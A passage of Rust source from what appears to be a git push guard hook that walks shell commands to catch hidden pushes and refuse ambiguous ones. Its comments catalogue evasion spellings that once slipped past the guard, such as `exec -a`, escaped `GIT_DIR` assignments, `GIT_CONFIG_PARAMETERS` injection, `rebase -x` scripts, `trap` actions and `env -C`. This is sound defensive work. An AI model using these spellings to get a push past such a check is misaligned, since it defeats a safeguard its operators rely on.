        // **A `}` that closes a `${` is a parameter expansion, not a word byte.**
        // `${BRANCH}`, `${HOME}`, `${OUT}` — the recommended spelling — end a
        // segment with a `}` glued to a letter, which is this predicate's exact
        // shape. Without the carve-out `echo ${HOME}; git push origin main`
        // refused every later push in the scope while `echo $HOME; …` resolved:
        // one character apart, on the spelling CI scripts are written in. Such a
        // brace does not flag, which is what stops the scope poisoning.
        //
        // It does **not** keep the brace byte, and that half was tried and
        // removed rather than left in as a comment-deep promise:
        // `executable_tokens` re-applies `strip_group_wrappers` internally, so
        // the trim lands a second time below this walk and only a `core::shell`
        // change would stop it. `git push origin ${BRANCH}` therefore records
        // `${BRANCH` and refuses on `is_safe_ref` rejecting the `$` — a refusal
        // either way, with a truncated refspec in the record. Named in the
        // plan's open list (cadence-hooks#237 security review, F28/F29/F30, I1).
        let tail_start = trimmed.len() - trailing_trim_run;
        let unbalanced_closer = trimmed
            .char_indices()
            .skip_while(|(index, _)| *index < tail_start)
            .any(|(index, c)| {
                c == '}'
                    && !closes_parameter_expansion(&trimmed[..index])
                    && trimmed[..index]
                        .chars()
                        .next_back()
                        .is_some_and(|before| !before.is_whitespace() && before != ';')
            });
        // Marks ride alongside the tokens because quote removal has already
        // happened by the time anything downstream sees them, and a redirect
        // decision cannot be made without knowing what was quoted (F25).
        let (tokens, unquoted_prefix_lens) = executable_tokens_marked(segment);
        let argv = skip_runner_assignments(&tokens, peel_command_runners(&tokens));
        // `argv` is a tail subslice of `tokens`, so its marks are the same tail.
        let argv_quoted = &unquoted_prefix_lens[tokens.len().saturating_sub(argv.len())..];

        // The prefix words the peel removed. A `GIT_DIR=` assignment lives
        // there, and it redirects the push exactly as the flag does — checked
        // on the prefix only, so a refspec or message that happens to contain
        // the text cannot mark an invocation unresolved. Both spellings are
        // tested because an `env` OPERAND reaches `env` already unescaped.
        let prefix = &tokens[..tokens.len().saturating_sub(argv.len())];
        let prefix_redirect = prefix.iter().any(|word| {
            names_git_redirect(word) || names_git_redirect(unescape_word(word).as_ref())
        });

        if segment_persists_git_redirect(argv, &tokens) {
            scope_unresolved = true;
        }
        // An unbalanced closer reaches BOTH faces: the push read (whose refspec
        // lost bytes) and the directory read (whose operand did), so it marks
        // the whole scope rather than this segment alone.
        if unbalanced_closer {
            scope_unresolved = true;
        }
        let segment_unresolved = scope_unresolved || prefix_redirect;
        // Known substitutions are read by name only when nothing in the
        // command can have redefined the name and the segment has no quoting
        // that could make the text a literal (cadence-hooks#1095 review).
        let known_ok = walk.trusts_known_commands && substitutions_are_live(segment);
        // `env -C DIR`/`--chdir=DIR` runs this segment's command in DIR — and
        // any child script it starts — without moving the scope.
        //
        // Borrowed where it does not move: a copy per segment made a 200 KB
        // `cd a; cd a; …` flood quadratic in the path it builds.
        let (segment_dir, segment_directory) = match env_chdir(prefix) {
            EnvChdir::Stay => (Cow::Borrowed(effective_dir.as_str()), scope_directory),
            EnvChdir::To(dir) => (
                Cow::Owned(resolve_cd_target(dir, &effective_dir)),
                scope_directory,
            ),
            EnvChdir::Unreadable => (Cow::Borrowed(effective_dir.as_str()), true),
        };

        // Children run with the directory in effect HERE — a substitution is
        // evaluated before its own segment runs — and in their OWN scope, so
        // their `cd`s die with the subshell. What this walk cannot vouch for is
        // the opposite: an env redirect crosses into the child, and a directory
        // this walk has lost track of is lost for the child too.
        //
        // A `trap` action is the exception to "the directory in effect HERE":
        // it runs when the signal fires, in whatever directory the parent has
        // reached by then (`trap 'git push origin main' EXIT; cd /other` pushes
        // from `/other`), so its child starts unresolved.
        if depth < MAX_WRAPPER_DEPTH {
            let child_doubt = Doubt {
                // So is a `find -execdir`/`-okdir` command: it runs in each
                // match's directory, any of which may be another repository.
                repository: segment_unresolved
                    || installs_trap_action(argv)
                    || runs_in_found_directories(argv),
                directory: segment_directory,
            };
            for child in child_scripts_but_git_exec(argv, segment) {
                collect_push_invocations(
                    &child,
                    &segment_dir,
                    depth + 1,
                    child_doubt,
                    walk,
                    writes,
                    out,
                );
            }
        }
        if let Some(exec) = git_exec(&tokens) {
            collect_git_exec_pushes(
                argv,
                &exec,
                &segment_dir,
                depth,
                Doubt {
                    repository: segment_unresolved,
                    directory: segment_directory,
                },
                known_ok,
                walk,
                writes,
                out,
            );
        }

        match directory_verb(&tokens, known_ok) {
            Some(DirectoryVerb::Knowable(verb_tokens)) => {
                match resolve_directory_verb(verb_tokens, known_ok) {
                    Some((target, absolute)) => {
                        // In place: a fresh join per `cd` copied the whole
                        // path each time, quadratic under a `cd a; …` flood.
                        if let Some(target) = target {
                            apply_cd_target(&mut effective_dir, target);
                        }
                        // A literal absolute target is where the shell is now,
                        // whatever came before it, so the directory doubt ends
                        // here. A which-repository doubt does not.
                        if absolute {
                            scope_directory = false;
                        }
                    }
                    // The target could not be read. Keeping the pre-`cd`
                    // directory and saying nothing is the trap — see
                    // [`resolve_directory_verb`].
                    None => scope_directory = true,
                }
                continue;
            }
            Some(DirectoryVerb::Unknowable) => {
                scope_unresolved = true;
                // Deliberately NOT a `continue`. `eval` is both a directory-verb
                // refusal (F20) and a prefix a push can hide behind (F16), and
                // `continue`ing here would drop `eval git push origin main`
                // entirely — trading one silent allow for another. Falling
                // through costs nothing on the other rows: a `cd`-shaped segment
                // names no git verb, so both the push read and the fallback
                // below decline it.
            }
            None => {}
        }

        // A write to the repository's remote config lands on disk, so it
        // reaches every later push in the command, in this scope or any other
        // — a subshell's `git remote set-url` outlives the subshell
        // (cadence-hooks#1156).
        writes.extend(config_writes_of(
            argv,
            argv_quoted,
            &tokens,
            &unquoted_prefix_lens,
            &segment_dir,
            known_ok,
            walk.gh_hosts,
        ));

        if let Some(mut invocation) = push_invocation_of(argv, argv_quoted, &segment_dir, known_ok)
        {
            apply_config_writes(writes, &mut invocation);
            invocation.unresolved |= segment_unresolved || segment_directory;
            invocation.repository_unresolved |= segment_unresolved;
            invocation.directory_unverified |= segment_directory;
            // Only an implicit refspec stands on the `push.default`
            // computation; a named one replaces it, so the config question does
            // not arise and no git call is made.
            if walk.probe_config && invocation.refspecs.iter().all(|refspec| refspec.implicit) {
                invocation.unresolved |= implicit_push_config_unresolvable(&invocation.work_dir);
            }
            out.push(invocation);
        } else if hides_a_push_behind_a_prefix(argv, &tokens, &unquoted_prefix_lens, &segment_dir) {
            out.push(unresolvable_push(&segment_dir, segment_directory));
        }
    }
}

/// A push this walk knows may run but cannot place or describe: every
/// which-repository doubt set, so a fail-closed caller refuses it.
fn unresolvable_push(work_dir: &str, directory_unverified: bool) -> PushInvocation {
    PushInvocation {
        work_dir: work_dir.to_string(),
        refspecs: Vec::new(),
        all_or_mirror: false,
        tags: false,
        dry_run: false,
        mirror: false,
        follow_tags: None,
        recurse_submodules: None,
        unresolved: true,
        repository_unresolved: true,
        directory_unverified,
        config_destinations: Vec::new(),
        destination_unreadable: false,
        config_remotes: Vec::new(),
        repository: None,
        via_alias: false,
    }
}

/// The top of the working tree `work_dir` is in, where git runs a rebase or
/// bisect command ([`GitExec::at_toplevel`]): the nearest directory, from
/// `work_dir` up, holding a `.git`, which is where git's own discovery stops.
/// Read from the file system so no subprocess is spawned; when there is none
/// and the walk may probe, git is asked (bounded). `None` when neither can
/// say — a relative `work_dir`, a directory that is not there — and the
/// caller keeps `work_dir` with a directory doubt. A `core.worktree` set in
/// the repository's config moves the top where neither reading looks
/// (cameronsjo/cadence-hooks#1231).
fn toplevel_of(work_dir: &str, probe: bool) -> Option<String> {
    let path = std::path::Path::new(work_dir);
    if path.is_absolute()
        && let Some(top) = path.ancestors().find(|dir| dir.join(".git").exists())
    {
        return top.to_str().map(str::to_string);
    }
    if !probe {
        return None;
    }
    match git_output_detailed(work_dir, &["rev-parse", "--show-toplevel"]) {
        GitOutput::Ok(top) if !top.is_empty() => Some(top),
        _ => None,
    }
}

/// More exec scripts than this on one git invocation are read as one push
/// that cannot be resolved rather than walked: the count is the command's to
/// choose, and each costs a walk (and, for a bare push, a config probe).
const MAX_GIT_EXEC_SCRIPTS: usize = 16;

/// Walk the commands one git invocation runs through an exec argument of its
/// own — `rebase -x`, a rebase's editor, `bisect run`, `difftool -x`,
/// `submodule foreach`, `filter-branch --*-filter`, a transport's
/// `--upload-pack`/`--receive-pack`/`--exec` ([`git_exec`]) — as the child
/// scripts they are (cameronsjo/cadence-hooks#1226). Before this, `git rebase
/// -x 'git push origin main' HEAD~1` pushed while every push guard saw only a
/// rebase.
///
/// **Where they run.** git runs a rebase, bisect or difftool command at the
/// top of the working tree the `-C`/cwd directory is in (measured under git
/// 2.43 from a subdirectory, with no `GIT_DIR` exported), so the walk starts
/// it there ([`toplevel_of`]), or in the `-C`/cwd directory with a directory
/// doubt when the top cannot be found. It cannot vouch for the rest, and
/// marks them as a which-repository doubt:
///
/// - `submodule foreach` runs in each submodule, `filter-branch` with
///   `GIT_DIR` exported, a transport command wherever the remote is served
///   ([`GitExec::elsewhere`]);
/// - a `--git-dir`/`--work-tree` global is exported to the command;
/// - a `-c`/`--config-env` global is exported too (`GIT_CONFIG_PARAMETERS`,
///   measured), reaching the nested push's remote and ref config where no
///   reading of the nested text sees it.
///
/// **What cannot be read is a push that cannot be resolved**, never an absent
/// one: a command whose name is an expansion (`-x "$CMD"`), more scripts than
/// [`MAX_GIT_EXEC_SCRIPTS`], or nesting past [`MAX_WRAPPER_DEPTH`] — so a
/// `git rebase -x "git rebase -x …"` flood stops at the bound and refuses.
/// A script that runs `sh -c "$CMD"` or `eval "$CMD"` is read like the same
/// command at the top level, which does not refuse it
/// (cameronsjo/cadence-hooks#1231).
#[allow(clippy::too_many_arguments)]
fn collect_git_exec_pushes(
    argv: &[String],
    exec: &GitExec,
    segment_dir: &str,
    depth: usize,
    inherited: Doubt,
    known_ok: bool,
    walk: Walk<'_>,
    writes: &mut Vec<ConfigRedirect>,
    out: &mut Vec<PushInvocation>,
) {
    let (work_dir, exported, unreadable_dir) = match argv.split_first() {
        Some((first, operands)) if command_word(first) == "git" => {
            let globals = git_globals(operands, segment_dir, known_ok);
            let written = &operands[..operands.len() - globals.rest.len()];
            let exports_config = written.iter().any(|word| {
                let word = unescape_word(word);
                word == "-c" || word.starts_with("--config-env")
            });
            (
                globals.work_dir,
                globals.foreign_redirect || exports_config,
                globals.unreadable_dir,
            )
        }
        _ => (segment_dir.to_string(), false, false),
    };
    // A rebase or bisect command runs at the top of the working tree, not in
    // the `-C`/cwd directory: from `R/a`, `git rebase -x 'cd x && git push'`
    // pushes from `R/x`, never `R/a/x` (measured, git 2.43).
    let (work_dir, lost_toplevel) = if exec.at_toplevel && !exec.elsewhere {
        match toplevel_of(&work_dir, walk.probe_config) {
            Some(top) => (top, false),
            None => (work_dir, true),
        }
    } else {
        (work_dir, false)
    };
    let doubt = Doubt {
        repository: inherited.repository || exec.elsewhere || exported,
        directory: inherited.directory || unreadable_dir || lost_toplevel,
    };
    if depth >= MAX_WRAPPER_DEPTH
        || exec.scripts.len() > MAX_GIT_EXEC_SCRIPTS
        || exec
            .scripts
            .iter()
            .any(|script| runs_an_unreadable_command(script))
    {
        out.push(unresolvable_push(&work_dir, doubt.directory));
    }
    if depth >= MAX_WRAPPER_DEPTH || exec.scripts.len() > MAX_GIT_EXEC_SCRIPTS {
        return;
    }
    for script in &exec.scripts {
        collect_push_invocations(script, &work_dir, depth + 1, doubt, walk, writes, out);
    }
}

/// `segment` without a leading function-definition head — `f()`, `f ( )`,
/// `function f`, `function f()` — so its body reads as the command it is.
fn strip_function_head(segment: &str) -> &str {
    static HEAD: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
        regex::Regex::new(
            r"^\s*(?:function\s+[^\s(){}]+\s*(?:\(\s*\))?|[^\s(){}=$`'\x22]+\s*\(\s*\))\s*(?:[{(]|$)",
        )
        .expect("pattern should compile")
    });
    match HEAD.find(segment) {
        Some(head) => {
            // Keep the group opener: `strip_group_wrappers` removes it.
            let opener = segment[..head.end()].ends_with(['{', '(']);
            &segment[head.end() - usize::from(opener)..]
        }
        None => segment,
    }
}

/// Where an `env` in a segment's prefix words runs its command.
enum EnvChdir<'a> {
    /// No `-C`/`--chdir`.
    Stay,
    /// A literal directory, resolved against the scope's directory.
    To(&'a str),
    /// A target carrying `$` or a backtick.
    Unreadable,
}

/// Read `env -C DIR` / `--chdir DIR` / `--chdir=DIR` (and `-C` inside a short
/// cluster, `-iC DIR`) out of the prefix words the runner peel removed. The
/// peel steps over `-C` as a value flag and so never looked at the directory:
/// `env -C /other git push origin main` pushed from `/other` while the walk
/// reported the scope's own directory (cadence-hooks#1095 review). The last
/// `-C` wins, and an `env` whose options this cannot read yields `Stay`: the
/// peel then refuses at that `env` too, so no push is resolved past it.
fn env_chdir(prefix: &[String]) -> EnvChdir<'_> {
    let mut found: Option<&str> = None;
    let mut in_env = false;
    let mut idx = 0;
    while let Some(raw) = prefix.get(idx) {
        idx += 1;
        if command_word(raw) == "env" {
            in_env = true;
            continue;
        }
        if !in_env {
            continue;
        }
        let word = unescape_word(raw);
        if !word.starts_with('-') || word.as_ref() == "-" || word.as_ref() == "--" {
            // An assignment operand keeps `env` reading; anything else is the
            // next runner in the prefix.
            in_env = word.contains('=') || word.as_ref() == "--";
            continue;
        }
        if let Some(value) = raw.strip_prefix("--chdir=") {
            found = Some(value);
        } else if word.as_ref() == "--chdir" {
            found = prefix.get(idx).map(String::as_str);
            idx += 1;
        } else if word.as_ref() == "--unset" {
            idx += 1;
        } else if !word.starts_with("--") {
            let cluster = &raw[raw.find('-').map_or(0, |at| at + 1)..];
            for (pos, c) in cluster.char_indices() {
                let glued = &cluster[pos + c.len_utf8()..];
                if c == 'C' {
                    if glued.is_empty() {
                        found = prefix.get(idx).map(String::as_str);
                        idx += 1;
                    } else {
                        found = Some(glued);
                    }
                    break;
                }
                if matches!(c, 'u' | 'P') {
                    if glued.is_empty() {
                        idx += 1;
                    }
                    break;
                }
            }
        }
    }
    match found {
        None => EnvChdir::Stay,
        Some(dir) if dir.contains(['$', '`']) => EnvChdir::Unreadable,
        Some(dir) => EnvChdir::To(dir),
    }
}

/// Does this segment run a push through a prefix the peel could not get past?
///
/// **A segment the walk cannot peel was being DROPPED, and absence is the
/// strongest allow shape there is.** [`crate::shell::skip_transparent_prefixes`]
/// refuses to skip a prefix whose next token is a flag — deliberately, so a
/// prefix's own option grammar is never parsed — and `command`, `exec`, `time`
/// and `nohup` have no `COMMAND_RUNNERS` second path the way `env` and `nice` do.
/// So `command -p git push origin main` and `exec -a x git push origin main`,
/// ordinary spellings with no escape anywhere, ran under bash, zsh and sh
/// (measured) while this module reported nothing at all.
///
/// This mirrors the same fallback pattern the delete guard removed in
/// cadence-ecosystem#582 used at its own position (cadence-hooks#426/#443):
/// when `argv` still leads with a prefix and the segment names a
/// push anywhere in its token stream, emit an **unresolvable** push rather than
/// nothing. An unresolvable push is a refusal a caller can explain; an absent one
/// is a silent allow. Parsing each prefix's flag grammar instead would mean
/// enumerating someone else's surface, which grows without telling us.
///
/// `builtin -p git push` is over-refused — it fails in all three shells, so
/// nothing is published — and that is the safe side of this trade.
fn hides_a_push_behind_a_prefix(
    argv: &[String],
    tokens: &[String],
    unquoted_prefix_lens: &[usize],
    effective_dir: &str,
) -> bool {
    let leads_with_a_prefix = argv.first().is_some_and(|first| {
        // **`command_word`, not `names_transparent_prefix` — the membership test
        // has to BASENAME here.** Every sibling asking this question already
        // does: `peel_command_runners`'s runner test goes through
        // `command_word`, and so does the fallback this mirrors
        // (cameronsjo/cadence-ecosystem#582). The shared primitive unescapes and
        // folds and stops there, so `/usr/bin/nohup -- git push origin main` and
        // `/usr/bin/time -p git push` — real binaries, ordinary spellings,
        // running under bash, zsh and sh (measured) — answered false and the
        // segment vanished. `env` and `nice` were saved only because they are
        // also `COMMAND_RUNNERS`, whose peel basenames.
        //
        // Fixed locally rather than in `names_transparent_prefix`: widening the
        // primitive reaches `skip_transparent_prefixes` and `enforce_worktree`'s
        // env walk, the whole-guard blast radius this branch has deferred twice.
        // The gap is recorded in the plan's documented-miss paragraph and filed
        // (cadence-hooks#237 security review, F22).
        let word = command_word(first);
        // `eval` joins the prefix set for the same reason: it is in neither
        // `TRANSPARENT` nor `COMMAND_RUNNERS`, so nothing else in this walk
        // will ever get past it.
        //
        // So do the command runners (`sudo`, `xargs`, `stdbuf`, `timeout`,
        // `setsid`): the peel only leaves one as the head when it met an
        // option it does not model, and `sudo -D DIR` / `--chdir DIR` runs the
        // push in another repository with none of that visible here
        // (cadence-hooks#1141). Refuse rather than guess the option's grammar.
        TRANSPARENT.contains(&word.as_ref())
            || word == "eval"
            || COMMAND_RUNNERS.contains(&word.as_ref())
    });
    leads_with_a_prefix && names_a_push(tokens, unquoted_prefix_lens, effective_dir)
}

/// Does this token stream run `git push`, at any position?
///
/// Runs only after the structured read has already declined the segment, so its
/// job is to decide between *refuse* and *say nothing*, never to describe the
/// push.
///
/// **It reads the globals rather than scanning adjacent pairs.** A `windows(2)`
/// scan required `git` and `push` to touch, and git accepts globals before its
/// subcommand — so `command -p git -C /other push origin main` slipped straight
/// back into the silent allow this fallback exists to close, and `-C /other`
/// does not merely hide that push, it sends it to another repository. Reusing
/// [`git_globals`] — the walk [`push_invocation_of`] already trusts — inherits
/// `VALUE_GLOBALS` for free, so the list cannot drift into a second spelling,
/// and it costs nothing in coarseness: the verb is still basenamed and the
/// subcommand still unescaped, so `\git pu\sh` still matches.
///
/// It does **not** stop the fallback firing on the phrase in argument position.
/// `command -p grep git push file` still refuses, because `git push` really is
/// adjacent there and reading those two words as a push is correct in
/// isolation. Telling them apart needs to know that `grep`, not `git`, is what
/// the prefix runs — the per-prefix flag grammar this fallback exists precisely
/// to avoid parsing. It is an over-refusal on a contrived command, pinned by a
/// test so it cannot drift unnoticed (cadence-hooks#237 security review, F23;
/// N26 stays open).
fn names_a_push(tokens: &[String], unquoted_prefix_lens: &[usize], effective_dir: &str) -> bool {
    // Redirections come out FIRST, for the same reason `push_invocation_of`
    // strips before its verb test: a redirect standing between `git` and its
    // subcommand stopped the globals walk dead, so `command -p git >log push`
    // reached neither the structured read nor this fallback (F26).
    let stripped: Vec<String> = strip_unquoted_redirections(tokens, unquoted_prefix_lens)
        .into_iter()
        .cloned()
        .collect();
    stripped.iter().enumerate().any(|(index, word)| {
        command_word(word) == "git"
            && stripped.get(index + 1..).is_some_and(|after_verb| {
                git_globals(after_verb, effective_dir, false)
                    .rest
                    .first()
                    .is_some_and(|subcommand| unescape_word(subcommand).as_ref() == "push")
            })
    })
}

/// Env-variable assignments that redirect a push somewhere this walk cannot
/// follow — the environment spelling of the flags that set `unresolved`.
///
/// Two families. `GIT_DIR`/`GIT_WORK_TREE` point git at another repository, the
/// env form of `--git-dir`/`--work-tree`. The `GIT_CONFIG_*` family injects
/// arbitrary configuration, which reaches `push.default` and
/// `remote.<name>.push` — and it is worse than the flag form for the probe in
/// [`implicit_push_config_unresolvable`], because after `GIT_CONFIG_COUNT` runs,
/// `git config --get push.default` (exactly what that probe reads) still answers
/// the repository's value. The probe's own instrument reports "not configured"
/// about a push git performs under the injected setting, so the only honest
/// answer is to refuse.
///
/// **The `GIT_CONFIG` family is matched as a family, not enumerated.** An
/// earlier cut listed `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_`, `GIT_CONFIG_VALUE_`,
/// `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_SYSTEM` — and a review found
/// `GIT_CONFIG_PARAMETERS`, a sixth spelling git honours standalone with no
/// `GIT_CONFIG_COUNT` at all (`GIT_CONFIG_PARAMETERS="'push.default=matching'"`
/// measured setting it). That is the second round in which one more member of
/// the same channel turned up, which is the tell that the list is the wrong
/// shape: it enumerates someone else's surface, and that surface grows without
/// telling us. Matching the prefix admits only what can be vouched for and
/// refuses the rest, unknown spellings included; over-refusing costs a caller an
/// explainable refusal.
const GIT_REDIRECT_ENV_PREFIXES: &[&str] = &["GIT_DIR=", "GIT_WORK_TREE=", "GIT_CONFIG"];

/// Skip assignment operands that a RUNNER hands to the program it execs, which
/// the shell has already unescaped.
///
/// **Two positions, opposite answers, same word.** `GIT_\DIR=/x git push` is an
/// assignment to no shell — a quoted character in the name disqualifies it, and
/// measured, all three answer `GIT_DIR=/nope: No such file or directory` — so
/// `is_assignment_word`'s raw test correctly refuses it and the walk correctly
/// sees no push. But as an operand of `env`, the shell strips the backslash
/// *before* `env` sees it, so `env GIT_\DIR=/x git push` really does set
/// `GIT_DIR` (measured: `env GIT_\DIR=/nope git rev-parse --git-dir` reports
/// `not a git repository: '/nope'` under bash, zsh and sh) — and the walk saw
/// no push at all for a command publishing from `/x`.
///
/// So the escape removal belongs HERE, at the runner-operand position, and not
/// inside `is_assignment_word`, where it would wrongly admit the bare-prefix
/// spelling. Gated on a runner actually having been peeled, for the same
/// reason.
fn skip_runner_assignments<'a>(tokens: &'a [String], argv: &'a [String]) -> &'a [String] {
    // **Keyed on the region the peel consumed, not on `tokens[0]`.** The runner
    // is not always first: any transparent prefix in front of it turned the gate
    // off while the peel still happened, so `exec env GIT_\DIR=/x git push` left
    // `argv[0]` as the assignment word and the whole segment went unseen — for a
    // command that publishes from `/x` (measured: `exec env GIT_\DIR=/nope git
    // rev-parse --git-dir` reports `not a git repository: '/nope'` under bash,
    // zsh and sh). Requiring SOME peeled word to be a runner keeps the
    // bare-prefix refusal below intact (cadence-hooks#237 security review, F19).
    let peeled = &tokens[..tokens.len().saturating_sub(argv.len())];
    let peeled_a_runner = !peeled.is_empty()
        && peeled
            .iter()
            .any(|word| COMMAND_RUNNERS.contains(&command_word(word).as_ref()));
    if !peeled_a_runner {
        return argv;
    }
    let mut start = 0;
    while argv
        .get(start)
        .is_some_and(|word| is_assignment_word(unescape_word(word).as_ref()))
    {
        start += 1;
    }
    argv.get(start..).unwrap_or(argv)
}

/// Is this word an assignment from [`GIT_REDIRECT_ENV_PREFIXES`]?
fn names_git_redirect(word: &str) -> bool {
    GIT_REDIRECT_ENV_PREFIXES
        .iter()
        .any(|prefix| word.starts_with(prefix))
}

/// Does this segment set a git redirect that OUTLIVES it?
///
/// Two shapes do, and they are the ones a command prefix is not: an explicit
/// `export`/`declare`/`typeset`, and an assignment segment with no command word
/// at all (`GIT_DIR=/x;`). Both leave the variable set for every later segment
/// in the scope.
///
/// A prefix (`GIT_DIR=/x git status`) is deliberately excluded — the shell sets
/// it for that one command — so it marks its own segment and never leaks
/// forward.
///
/// "No command word" is spelled as *every token is an assignment word*, not as
/// an empty `argv`: [`crate::shell::skip_transparent_prefixes`] stops before the
/// LAST token (`start + 1 < len`), so an assignment-only segment still comes
/// back as a one-token `argv` and an emptiness test never fires — measured, it
/// silently dropped `GIT_DIR=/x; git push`.
fn segment_persists_git_redirect(argv: &[String], tokens: &[String]) -> bool {
    let exported = argv.first().is_some_and(|word| {
        matches!(
            command_word(word).as_ref(),
            "export" | "declare" | "typeset"
        )
    }) && argv.iter().skip(1).any(|word| {
        // Both spellings, exactly as `prefix_redirect` does. `export`,
        // `declare` and `typeset` are BUILTINS, so the shell unescapes their
        // operands before they see them — measured, `export GIT_\DIR=/nope`
        // then `git rev-parse --git-dir` answers `not a git repository:
        // '/nope'` under bash, zsh and sh. Testing them raw left the redirect
        // invisible, and this one is worse than the `env` prefix form because
        // an `export` persists for EVERY later segment in the scope
        // (cadence-hooks#237 security review, F18).
        names_git_redirect(word) || names_git_redirect(unescape_word(word).as_ref())
    });

    let assignment_only = !tokens.is_empty() && tokens.iter().all(|t| is_assignment_word(t));

    exported || (assignment_only && tokens.iter().map(String::as_str).any(names_git_redirect))
}

/// Does this repository's configuration replace the "publish the current
/// branch" computation the implicit `HEAD` refspec stands for?
///
/// Two settings do. `push.default=matching` publishes every local branch with a
/// same-named remote branch, HEAD or not — measured: on `main` with a divergent
/// `side`, a bare `git push origin` pushes `side`. Any `remote.<name>.push`
/// refspec replaces the computation outright.
///
/// **git reports "unset" and "unreadable" identically** — both exit non-zero,
/// so both arrive as [`GitOutput::Failed`] and read here as *not configured*,
/// which keeps the `HEAD` refspec. That is right for the unset case, which is
/// the overwhelmingly common one and means the default (`simple`). It is a
/// resolved-looking answer for the unreadable case, but a directory where git
/// cannot read config is one where [`outbound_commits`] also fails, and that
/// fails closed — so the composed posture still refuses.
fn implicit_push_config_unresolvable(work_dir: &str) -> bool {
    let push_default_matches_every_branch = matches!(
        git_output_detailed(work_dir, &["config", "--get", "push.default"]),
        GitOutput::Ok(value) if value.trim() == "matching"
    );
    let remote_push_refspec_configured = matches!(
        git_output_detailed(work_dir, &["config", "--get-regexp", r"^remote\..*\.push$"]),
        GitOutput::Ok(value) if !value.trim().is_empty()
    );
    push_default_matches_every_branch || remote_push_refspec_configured
}

/// Does this segment change the shell's working directory?
///
/// `pushd`/`popd` are here because leaving them out is not a *safe* omission:
/// the walk keeps its old directory and reports it with full confidence, so an
/// unmodelled directory verb produces a wrong answer rather than a refusal.
/// `pushd` with a literal path moves exactly like `cd`; `popd` returns to a
/// directory this walk never recorded.
///
/// **The peel here is deliberately NARROWER than [`peel_command_runners`], which
/// the push side uses.** That asymmetry is the point, not an oversight: a
/// directory verb only moves THIS shell when it runs as a builtin of it.
/// Measured, `pwd` after each:
///
/// | spelling | bash | zsh | sh | this walk |
/// |---|---|---|---|---|
/// | `cd /b` | moves | moves | moves | moves |
/// | `builtin cd /b` | moves | moves | moves | moves |
/// | `\cd /b`, `c\d /b` | moves | moves | moves | moves |
/// | `command cd /b` | moves | **does not** | moves | **refuses** |
/// | `command -p cd /b` | moves | **does not** | moves | **refuses** |
/// | `command command cd /b` | moves | **does not** | moves | **refuses** |
/// | `env cd /b`, `nice cd /b` | does not | does not | does not | ignores |
///
/// Three groups, three answers. `builtin` is unanimous, so the move is
/// knowable. `env`/`nice` exec a child that exits, so nothing moves anywhere and
/// ignoring them is correct — which is why reusing the push side's peel, which
/// strips both, would move the tracked directory for commands no shell moved.
/// **`command` is the one this walk cannot answer**: zsh forces external lookup
/// and the external `cd` execs a child, so bash and zsh genuinely disagree, and
/// the Bash tool on this estate is zsh. Picking either answer states a directory
/// with `unresolved: false` that the other shell never entered, so a
/// `command`-prefixed directory verb refuses instead (cadence-hooks#237 security
/// review, F5).
///
/// **The verb is matched EXACTLY, not through [`command_word`].** That helper
/// case-folds and strips a path and a `.exe`, which is right for `git` — an
/// executable file, found on `PATH`, spelled however the filesystem allows.
/// `cd` is a shell BUILTIN, and neither transformation applies to one. Measured:
/// `CD /usr` and `/usr/bin/cd /usr` both leave bash in the ORIGINAL directory,
/// so folding either into `cd` would move the tracked directory for a command
/// the shell never honoured — the same wrong-repository answer from the
/// opposite direction. Only a leading backslash is stripped, because `\cd` is
/// alias suppression and really does run the builtin.
///
/// What a directory verb this walk found means for the tracked directory.
enum DirectoryVerb<'a> {
    /// A verb whose effect every shell agrees on. The slice starts at the verb.
    Knowable(&'a [String]),
    /// A verb this walk cannot resolve to a directory, for either of the two
    /// reasons named on [`directory_verb`]. The scope is marked unresolved.
    Unknowable,
}

/// Classify a segment as a directory verb, or `None` when it is not one.
///
/// Two shapes are [`DirectoryVerb::Unknowable`] rather than a move:
///
/// 1. **A `command` prefix.** bash and sh move, zsh does not (measured), and
///    nothing here knows which shell runs the command.
/// 2. **Any backslash in the verb word.** [`crate::shell::tokenize`] throws
///    quoting away, so `'c\d' /x` and `c\d /x` arrive as the SAME token — and
///    the shells split on exactly that: measured, `\cd /usr` moves under bash,
///    zsh and sh while `'\cd' /usr` moves under none of them, because the quotes
///    make it a literal command name. (`cd\ /other` is one word the shell
///    never runs; the tokenizer keeps an escaped blank in its word, so it is
///    read that way here too and is not a directory verb.)
///
/// **Point 2 is the opposite call from the push verb, deliberately.** There,
/// unescaping only widens what is seen, and seeing more is the safe direction
/// for a detector. Here a wrong move is a wrong repository, so a token that
/// merely *could* unescape to a directory verb refuses. That over-refuses the
/// unquoted `\cd`, which really does move — an explainable refusal, traded
/// against a silently wrong answer.
fn directory_verb(tokens: &[String], known_ok: bool) -> Option<DirectoryVerb<'_>> {
    fn names_directory_verb(word: &str) -> bool {
        matches!(word, "cd" | "pushd" | "popd")
    }

    let mut start = 0;
    let mut command_prefixed = false;
    // **The peel reads the UNESCAPED word, and separately remembers that an
    // escape was there.** Comparing the raw token instead made a whole segment
    // invisible: `\builtin cd /other` broke the loop on `\builtin`, that word
    // became the candidate, it unescaped to `builtin` — not a directory verb —
    // and this returned `None`, which means "not a directory verb at all". The
    // caller then kept a STALE directory with `unresolved: false`, which is
    // strictly worse than the over-refusal below. Every row measured moves the
    // shell (cadence-hooks#237 security review, F9).
    let mut prefix_escaped = false;
    while start < tokens.len() {
        let raw = tokens[start].as_str();
        let word = unescape_word(raw);
        if is_assignment_word(word.as_ref()) {
            prefix_escaped |= raw.contains('\\');
            start += 1;
            continue;
        }
        // `builtin` takes NO options in bash, zsh or sh — measured, a flag word
        // makes it fail and the shell stays put, so `builtin -p cd /other`
        // never moves. Sharing `command`'s flag-skip loop swallowed the flag,
        // found `cd`, and reported the move: a wrong repository with
        // `unresolved: false`, and no `command_prefixed` to save it. `builtin
        // -- cd` splits three ways on top of that — bash and sh move, zsh does
        // not. Refusing on ANY flag is the same trade
        // [`resolve_directory_verb`] already makes for `pushd`: the flags that
        // change the verb outnumber the ones that do not, and enumerating them
        // is the wrong side of that problem.
        // **Both flag tests read the UNESCAPED word.** They were the last two
        // raw comparisons in this function, and a raw token starting with `\`
        // failed each of them: the loop broke on it, the flag became the
        // candidate, it was not a directory verb, and the walk returned `None`
        // — a stale directory with `unresolved: false`, the F9 mechanism one
        // token to the right. `builtin \-- cd /other` and `command \-p cd
        // /other` both move bash and sh (zsh stays), the exact three-way split
        // these arms exist to refuse. `prefix_escaped` below is a second,
